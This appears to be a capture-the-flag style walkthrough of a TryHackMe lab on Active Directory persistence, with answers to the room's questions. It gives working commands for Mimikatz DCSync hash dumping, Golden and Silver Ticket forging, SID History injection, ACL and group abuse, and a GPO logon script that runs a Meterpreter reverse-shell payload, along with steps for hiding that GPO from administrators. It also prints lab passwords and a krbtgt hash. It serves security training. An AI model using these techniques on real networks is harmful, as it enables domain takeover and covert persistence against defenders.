![image](https://github.com/user-attachments/assets/6d5aa736-4542-468d-bd56-1fc0cfa9b113)
# Persisting Active Directory
Learn about common Active Directory persistence techniques that can be used post-compromise to ensure the blue team will not be able to kick you out during a red team exercise.


TryHackMe room [link](https://tryhackme.com/room/persistingad)


<br>

## Task 1 : Introduction


This room is focusing on Active Directory (AD)  persistence techniques to maintain access even if credentials are rotated. The goal is to learn how to deploy 
persistence methods in AD, including:

  - AD Credentials & DCSync
  - Silver & Golden Tickets
  - AD Certificates
  - Security Identifiers (SIDs)
  - Access Control Lists (ACLs)
  - Group Policy Objects (GPOs)


<br>

First we need to setup the environment..

### 1. Connect to the Network

- If using the AttackBox (web-based):
  - It auto-connects to the network.
![image](https://github.com/user-attachments/assets/6f613807-b675-4a62-a689-8037bc5a41c3)
  - Verify connectivity by pinging THMDC.za.tryhackme.loc.
  - Configure DNS:

        sed -i '1s|^|nameserver 10.200.62.100\n|' /etc/resolv-dnsmasq

    (Replace <THMDC_IP> with the DC's IP from the network diagram.)
  ![image](https://github.com/user-attachments/assets/8422cd53-f7a2-4ff6-811b-b6e57f918be7)

  
  - Test DNS:

        nslookup thmdc.za.tryhackme.loc
    Should resolve to the DC's IP.

- If using your own machine (OpenVPN):
  - Download the .ovpn file from the room's access page.

![image](https://github.com/user-attachments/assets/7ddd7257-2a88-4f79-ba7d-ba4a037bf6c5)
    After succesfull connection, we can verify there..

  - Connect using:

        sudo openvpn persistingad.ovpn

![image](https://github.com/user-attachments/assets/f67dc148-09b1-4201-9c8e-00f0af65ad38)
  
Configure DNS as above at AttackBox.



### 2. Get Initial Credentials
  - Visit:

        http://distributor.za.tryhackme.loc/creds
   
  - Click `Get Credentials` to receive a username & password.

These credentials allow access to `THMWRK1.za.tryhackme.loc` (a jump host).

![image](https://github.com/user-attachments/assets/cdb24921-3c96-410d-8bc6-b5d8260040e2)


### 3. Access the Jump Host

> Via RDP (Remote Desktop):

  - Use RDP client for gui remote access.
  
          xfreerdp3 /v:thmdc.za.tryhackme.loc /u:tony.wilson /p:Corpus2002 /cert:ignore


> Via SSH (Faster):

  - Use SSH for cli remote access.
    
        ssh tony.wilson@za.tryhackme.loc@thmdc.za.tryhackme.loc

![image](https://github.com/user-attachments/assets/36a08160-505c-4df6-8aac-f4f2ce3888df)


<br>


## Task 2 : Persistence through Credentials

**Objective:**
  We will use Mimikatz to perform a DCSync attack and extract credentials (including NTLM hashes) from the domain controller.



### 1. Connect to THMWRK1 (Jump Host)
- Use SSH with the provided Domain Administrator (DA) credentials:

      ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc

    **Password:** `tryhackmewouldnotguess1@`

### 2. Launch Mimikatz
- Navigate to the `Mimikatz` directory and execute it:

      C:\Tools\mimikatz_trunk\x64\mimikatz.exe

![image](https://github.com/user-attachments/assets/e3425bee-0e72-4735-b84b-b3cc61d5aea2)

  
### 3. Perform a DCSync Attack
- For a single user (e.g., `tony.wilson`):

      lsadump::dcsync /domain:za.tryhackme.loc /user:tony.wilson

This extracts the NTLM hash and other details for the user test.

![image](https://github.com/user-attachments/assets/63b72f62-6e09-4b85-b55e-276f5bc968ca)


- For ALL users (full credential dump):

      log tony.wilson_dcdump.txt
      lsadump::dcsync /domain:za.tryhackme.loc /all
    
Replace username with your assigned username.
![image](https://github.com/user-attachments/assets/0e11595c-5b37-451d-b5ab-73240b8ce1a6)

After completion, exit Mimikatz (exit) to save the log.

### 4. Analyze the Dump
- Extract all usernames:

      cat tony.wilson_dcdump.txt | find "SAM Username"

- Extract all NTLM hashes:

      cat tony.wilson_dcdump.txt | find "Hash NTLM"

Look for the `krbtgt` user’s hash (used for Golden Ticket attacks).


<br>
## _Answers_

What is the Mimikatz command to perform a DCSync for the username of test on the za.tryhackme.loc domain?

      lsadump::dcsync /domain:za.tryhackme.loc /user:test
      
What is the NTLM hash associated with the krbtgt user?

    16f9af38fca3ada405386b3b57366082
<br>


## Task 3 : Persistence through Tickets
In this task we will forge Golden Tickets (TGTs) and Silver Tickets (TGSs) for persistence in Active Directory.



### 1. Kerberos Authentication Flow
- `AS-REQ` → User requests a TGT (encrypted with their `NTLM` hash).
- `TGT` → Signed by the KRBTGT account’s hash (stored on the `DC`).
- `TGS-REQ` → User requests a TGS for a service (e.g., `CIFS` for file access).
- `TGS` → Encrypted with the service’s NTLM hash (e.g., a machine account).

### 2. Golden Tickets (Forged TGTs)
- What? A fake TGT signed by the KRBTGT hash.
- Why? Bypasses authentication, grants domain-wide admin access.

- Requirements:
    - KRBTGT NTLM hash (from `DCSync`).
    - Domain SID (`S-1-5-21-...`).
    - User RID (e.g., `500` for Administrator).

- Features:
    - Valid for 10 years by default (`Mimikatz`).
    - Works even for deleted/non-existent users.
    - Bypasses smart card authentication.

### 3. Silver Tickets (Forged TGSs)
- What? A fake TGS signed by a machine account’s hash.
- Why? Grants local admin access to a specific host (e.g., `THMSERVER1`).
- Requirements:
    - Machine account’s NTLM hash (e.g., `THMSERVER1$`).
    - Domain SID.
- Features:
    - Harder to detect (no DC interaction).
    - Scope limited to one service (e.g., `CIFS` for file access).


> Workflow...

### 1. Gather Required Data
- KRBTGT Hash: From DCSync (lsadump::dcsync /user:krbtgt).
- Domain SID:

      Get-ADDomain | Select-Object DomainSID

Machine Account Hash: From DCSync (e.g., THMSERVER1$).

### 2. Generate a Golden Ticket

    kerberos::golden /admin:FakeAdmin /domain:za.tryhackme.loc /id:500 /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /endin:600 /renewmax:10080 /ptt
    
Flags:

  - `/ptt`: Injects ticket into memory.
  - `/endin`: Lifetime (default 10 hours).
  - `/renewmax`: Max renewal (default 7 days).

3. Verify Golden Ticket

        dir \\thmdc.za.tryhackme.loc\c$\

4. Generate a Silver Ticket

        kerberos::golden /admin:FakeUser /domain:za.tryhackme.loc /id:500 /sid:<DOMAIN_SID>/target:THMSERVER1.za.tryhackme.loc /rc4:<MACHINE_ACCOUNT_HASH> /service:cifs /ptt

Flags:
    - `/service:cifs`: Targets file sharing.
    - `/rc4`: Machine account’s NTLM hash.

5. Verify Silver Ticket

        dir \\thmserver1.za.tryhackme.loc\c$\

<br>
## _Answers_

Which AD account's NTLM hash is used to sign Kerberos tickets?

      krbtgt

What is the name of a ticket that impersonates a legitimate TGT?

      Golden ticket

What is the name of a ticket that impersonates a legitimate TGS?

      Silver ticket

What is the default lifetime (in years) of a golden ticket generated by Mimikatz?
      
      10
  

<br>  




## Task 4: Persistence through Certificates

> Objective:

  - Use AD Certificate Services (`AD CS`) for persistence by:
  - Extracting the CA’s private key (using `Mimikatz`).
  - Forging a client authentication certificate (using `ForgeCert`).
  - Requesting Kerberos TGTs (using `Rubeus`) to maintain access even after credential rotation.

> Key Concepts:
- **Why Certificates?**
    - Credential-agnostic persistence (survives password resets).
    - Hard to revoke (if CA private key is stolen).

- **CA Private Key:**
    - Stored on the CA server (`THMDC`).
    - Extracted using Mimikatz (`crypto::certificates /export`).
    
- **Forging Certificates:**
    - `ForgeCert.exe` generates fake certificates signed by the stolen CA key.
    - Used to request TGTs (via `Rubeus`).

- **Impact:**
    - `Blue team` must revoke the root CA (disruptive, requires full rebuild).



<br>
## _Answers_

What key is used to sign certificates to prove their authenticity?

      Private Key

What application can we use to forge a certificate if we have the CA certificate and private key?

     ForgeCert.exe
     
What is the `Mimikatz` command to pass a ticket from a file with the name of ticket.kirbi?

      kerberos::ptt ticket.kirbi

  

<br>  




## Task 5 : Persistence through SID History

- Abuse the SID History attribute in Active Directory to grant a low-privileged account Domain Admin (or higher) privileges without adding it to privileged groups.

> Key Concepts:

- SID History:
    
    - Normally used for domain migrations (retains access to old resources).
    - Can be abused to add privileged SIDs (e.g., `Domain Admins` SID) to a normal user.

- Requirements:
    
    - Domain Admin privileges (or equivalent) to modify `ntds.dit`.
    - DSInternals tool to patch the AD database (`ntds.dit`).

- Impact:
    
    - Stealthy persistence (user doesn’t appear in privileged groups).
    - Hard to detect (requires manual inspection of `SIDHistory` attribute).
 
> Workflow...

### 1. Check SID History:


    Get-ADUser <username> -Properties sidhistory
    
### 2. Get Target SID (e.g., `Domain Admins`):

    Get-ADGroup "Domain Admins"

### 3. Patch ntds.dit:
  
  - Stop NTDS service:
  
        Stop-Service -Name ntds -force
    
  - Inject SID History:
  
        Add-ADDBSidHistory -SamAccountName tony.wilson -SidHistory <target_SID> -DatabasePath C:\Windows\NTDS\ntds.dit
  
  - Restart NTDS service:
  
        Start-Service -Name ntds
  
4. Verify Persistence:
    Access restricted resources (e.g., `\\thmdc.za.tryhackme.loc\c$`).

<br>
## _Answers_

What AD object attribute is normally used to specify SIDs from the object's previous domain to allow seamless migration to a new domain?
    
      SIDHistory

![image](https://github.com/user-attachments/assets/2430c9bb-36c2-4019-8dfe-079678785a11)

What is the database file on the domain controller that stores all AD information?

     ntds.dit
     
![image](https://github.com/user-attachments/assets/315b3834-bdef-45c3-9a3f-5f35beb11c93)


What is the PowerShell command to restart the ntds service after we injected our SID history values?

    Start-Service -Name ntds

![image](https://github.com/user-attachments/assets/3db2d23b-23ea-4e82-bea0-960935dac516)



<br>


## Task 6 : Persistence through Group Membership
  
  Use `nested AD groups` to maintain persistence by hiding privileged access within subgroups, avoiding direct membership in monitored groups like `Domain Admins`.

> Key Concepts:

- **Nested Groups:** Groups that are members of other groups, creating layers of membership.
- **Reduced Visibility:** Monitoring tools often only check direct group members, not nested subgroups.
- **Persistence Technique:**
    
    - Add a low-privileged user to a non-monitored subgroup.
    - Nest that subgroup into a privileged group (e.g., `Domain Admins`).
    - Result: The user gains indirect privileged access without triggering alerts.

> Workflow..

- Create Nested Groups:

      New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "tony.wilson Net Group 1" -SamAccountName "tony.wilson_nestgroup1" -GroupScope Global -GroupCategory Security

- Add Nested Membership:

      Add-ADGroupMember -Identity "tony.wilson_nestgroup2" -Members "tony.wilson_nestgroup1"
  
- Link to Privileged Group:

      Add-ADGroupMember -Identity "Domain Admins" -Members "tony.wilson_nestgroup5"

- Verify Access:
    Low-privileged user can now access restricted resources (e.g., `\\thmdc.za.tryhackme.loc\c$`).


<br>
## _Answers_

What is the term used to describe AD groups that are members of other AD groups?

      Group Nesting

What is the command to add a new member, thmtest, to the AD group, thmgroup?

      Add-ADGroupMember -Identity "thmgroup" -Members "thmtest"

<br>


## Task 7 : Persistence through ACLs

In this we go though method to abuse the AdminSDHolder container to persistently gain Full Control over all Protected Groups (e.g., Domain Admins) by manipulating its ACL.

> Key Concepts:
- **AdminSDHolder**:
    
    - A hidden container in AD (`CN=AdminSDHolder,CN=System,DC=domain,DC=loc`).
    - Its ACL is used as a template for all Protected Groups (e.g., `Domain Admins`, `Enterprise Admins`).
      
- **SDProp** (Security Descriptor Propagator):
    
    - An AD service that every 60 minutes copies the AdminSDHolder’s ACL to all Protected Groups.
      
- Persistence Technique:
    
    - Add your user to `AdminSDHolder`’s ACL with Full Control.
    - `SDProp` propagates this change to all Protected Groups.
    - Now you can modify any Protected Group (e.g., add yourself to `Domain Admins`).

> Workflow...
- Access AdminSDHolder:
    - Open MMC → AD Users & Computers (enable Advanced Features).
    - Navigate to:

          Domain > System > AdminSDHolder

    ![image](https://github.com/user-attachments/assets/ab3029a1-8af8-40b0-9f8a-8edda4955575)

  
- Modify ACL:
     Right-click `AdminSDHolder` → `Properties` → `Security` → `Add your user` → `Grant Full Control`.

    ![image](https://github.com/user-attachments/assets/c70fcffe-8547-43e5-9091-5b9b6c85e4e6)

    
- Trigger SDProp Manually (Optional):

      Import-Module .\Invoke-ADSDPropagation.ps1
      Invoke-ADSDPropagation

- Verify Persistence:

    Check `Domain Admins` group permissions → Your user now has `Full Control`.

Use this to add yourself to the group.




<br>
## _Answers_

What AD group's ACLs are used as a template for the ACLs of all Protected Groups?

        AdminSDHolder

What AD service updates the ACLs of all Protected Groups to match that of the template?

        SDProp

What ACL permission allows the user to perform any action on the AD object?

<br>


## Task 8: Persistence through GPOs
  
  In this task we will learn about `Use Group Policy Objects` (GPOs) to deploy persistence across the domain, ensuring callback shells when privileged users log in.

> Methods..
- **Logon Script Deployment:**
    - Create a batch script (`tony.wilson_script.bat`) to execute a Meterpreter payload (`tony.wilson_shell.exe`) on user logon.
    - Upload scripts to `SYSVOL` (accessible by all domain-joined hosts).
      
- **GPO Creation:**
    - Link a new `GPO` to the `Admins OU` to target privileged users.
    - Configure the GPO to run the script on logon (under `User Configuration` -> `Policies` -> `Windows Settings` -> `Scripts`).
      
- **Stealth Hardening:**
    - Remove default permissions (e.g., `Enterprise Domain Controllers`) to hide the GPO.
    - Restrict GPO readability to **Domain Computers** (prevents manual removal by admins).
 

> Workflow...
- Generate Payload & Script:

      msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=persistad LPORT=4445 -f exe > am0_shell.exe
  
  After successfully creation of the payload, we need to make some changes..

        copy \\za.tryhackme.loc\sysvol\tony.wilson_shell.exe C:\tmp\tony.wilson_shell.exe && timeout /t 20 && C:\tmp\tony.wilson_shell.exe
  
- Upload to `SYSVOL`:

      scp am0_shell.exe za\\Administrator@thmdc.za.tryhackme.loc:C:/Windows/SYSVOL/sysvol/za.tryhackme.loc/scripts/
  
- Create GPO:
    - `MMC` → `Group Policy Management` → Link `GPO` to `Admins OU`.
    - Enforce `GPO` and set `Logon Script` path.

- Trigger Execution:
    - Reset a `Tier 1 admin` password and RDP into `THMSERVER1/2` → Meterpreter session spawns.

- Hide the GPO:
    - Remove all delegations except Domain Computers (blocks admin access).





<br>

## _Answers_
What MMC snap-in can be used to manage GPOs?
    
      Group Policy Management
      
  ![image](https://github.com/user-attachments/assets/87c4173b-1e7f-429c-a68f-15081278ce81)


What sub-GPO is used to grant users and groups access to local groups on the hosts that the GPO applies to?

        Restricted Groups

What tab is used to modify the security permissions that users and groups have on the GPO?

          Delegation

  ![image](https://github.com/user-attachments/assets/82c62dfa-35af-46ca-ab21-8a24f7d396a3)



<br>




## Task 9: Conclusion

> Summary
- Persistence is Critical:
  - Deploy persistence throughout the attack chain (not just at the end).
  - Blend techniques to evade detection (e.g., combine Golden Tickets with ACL abuse).
- Advanced Techniques Not Covered Earlier:
  - Skeleton Keys:

      - Mimikatz deploys a master password that works for any account (e.g., mimikatz).
      - Normal passwords still function, making detection hard.

  - DSRM Account Abuse:
  
      - Domain Controllers (DCs) have a hidden emergency admin account (DSRM).
      - Extract its password with Mimikatz for persistent DC access.

  - Malicious SSPs:
      
      - Inject mimilib.dll as a Security Support Provider (SSP) to log all authentication attempts.

  - Computer Account Manipulation:
      - Disable automatic password rotation for a machine account and grant it admin rights to other hosts.

> Mitigations:
- Monitor for anomalies:

    - Unusual logon events (e.g., low-privileged accounts accessing Tier 0 resources).
    - Unexpected GPOs, ACL changes, or machine account modifications.

- Protect Privileged Resources:
    
    - Limit Tier 0 access to reduce the impact of persistence.
      
- Assume Breach:
    
    - Some techniques (e.g., AdminSDHolder abuse) may require a full domain rebuild to remediate.

> Final Notes:

- AD Security is Deep: This module is an introduction—real-world AD environments require continuous learning.
- Defense is Hard: Persistence techniques often abuse legitimate AD functions, making them stealthy.
- Think Like the Blue Team: Understand detection methods to refine attacks (e.g., avoid noisy tactics).

